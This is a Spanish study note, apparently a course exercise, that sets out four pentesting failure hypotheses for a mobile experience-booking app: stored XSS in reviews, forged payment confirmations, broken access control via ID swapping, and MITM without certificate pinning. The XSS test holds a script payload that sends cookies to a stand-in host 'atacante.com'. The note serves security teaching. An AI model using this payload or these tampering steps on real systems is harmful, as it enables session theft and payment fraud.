> [!example] Enunciado
> App móvil de experiencias curadas — Una aplicación móvil permite a los usuarios descubrir y reservar experiencias curadas. El sistema tiene: app móvil que se comunica con el backend vía API REST, autenticación mediante OAuth, sistema de pagos externo (tipo Stripe), creadores que publican experiencias, y usuarios que dejan reviews.
>
> Establecer 4 hipótesis de falla plausibles siguiendo la metodología de pentesting. Para cada una, definir una prueba concreta.

**Conceptos:**

* [[Metodología de Hipótesis de Falla]]
* [[CWE-79 - XSS]]
* [[Broken Access Control]]
* [[Certificate Pinning]]
* [[OAuth 2.0]]

**Hipótesis 1: XSS a través de las reviews**
- **Qué:** [[CWE-79 - XSS|Cross-Site Scripting]] almacenado en las reviews.
- **Por qué:** El texto libre de las reviews se muestra a otros usuarios; si no está sanitizado, se puede inyectar JavaScript.
- **Cómo:** Dejar una review con `<script>fetch('https://atacante.com/?token='+document.cookie)</script>`.
- **Impacto:** Robo de sesiones de otros usuarios.

**Hipótesis 2: Falsificación de confirmación de pago**
- **Qué:** Falta de validación server-side en la confirmación del proveedor de pagos externo.
- **Por qué:** Si el backend no valida que la notificación viene realmente del proveedor, un atacante puede simularla.
- **Cómo:** Interceptar con proxy y enviar directamente al backend una request simulando confirmación exitosa, sin completar el pago real.
- **Impacto:** Reservas sin pago real, pérdidas económicas.

**Hipótesis 3: Broken Access Control en la API REST**
- **Qué:** Falta de verificación de autorización en endpoints de gestión de experiencias.
- **Por qué:** Si los endpoints solo verifican autenticación y no que el usuario sea dueño del recurso, cualquiera puede modificar experiencias ajenas.
- **Cómo:** Interceptar el request de edición propia, cambiar el `id_experiencia` por uno ajeno. También probar `DELETE /api/experiencias/{id_ajeno}`.
- **Impacto:** Modificar o eliminar experiencias y reviews de otros.

**Hipótesis 4: MITM por falta de [[Certificate Pinning]]**
- **Qué:** Falta de certificate pinning en la app móvil.
- **Por qué:** Sin pinning, un atacante puede instalar un certificado propio y usar un proxy para interceptar todo el tráfico HTTPS.
- **Cómo:** Emulador + proxy (Burp Suite) + certificado propio instalado; observar si se intercepta el tráfico.
- **Impacto:** Ver tokens de [[OAuth 2.0]], datos personales y de pago, y modificar requests en tránsito.
